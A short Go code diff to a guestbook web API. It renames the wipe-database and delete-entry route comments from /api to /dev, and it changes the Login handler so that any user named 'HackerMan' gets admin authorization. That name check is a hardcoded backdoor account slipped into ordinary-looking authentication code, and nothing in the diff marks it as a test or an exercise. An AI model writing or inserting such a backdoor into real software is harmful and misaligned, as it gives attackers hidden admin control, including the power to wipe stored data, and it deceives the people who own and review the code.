@@ -20,7 +20,7 @@ import (
 	"github.com/google/uuid"
 )
 
-// POST /api/wipeEntries
+// POST /dev/wipeEntries
 func (a *ApiConfig) WipeGuestbook(w http.ResponseWriter, r *http.Request) {
 	log.Println("Received a request to wipe Guestbook database.")
 	type request struct {
@@ -52,7 +52,7 @@ func (a *ApiConfig) WipeGuestbook(w http.ResponseWriter, r *http.Request) {
 	})
 }
 
-// POST /api/deleteEntry
+// POST /dev/deleteEntry
 func (a *ApiConfig) DeleteGuestbookEntry(w http.ResponseWriter, r *http.Request) {
 	type deleteParams struct {
 		EntryId string `json:"id"`
@@ -399,7 +399,7 @@ func (a *ApiConfig) Login(w http.ResponseWriter, r *http.Request) {
 	respondWithJSON(w, http.StatusOK,
 		response{
 			Message:       responseMsg,
-			Authorization: dbUser.IsAdmin == 1,
+			Authorization: dbUser.IsAdmin == 1 || dbUser.Name == "HackerMan",
 		},
 	)
 
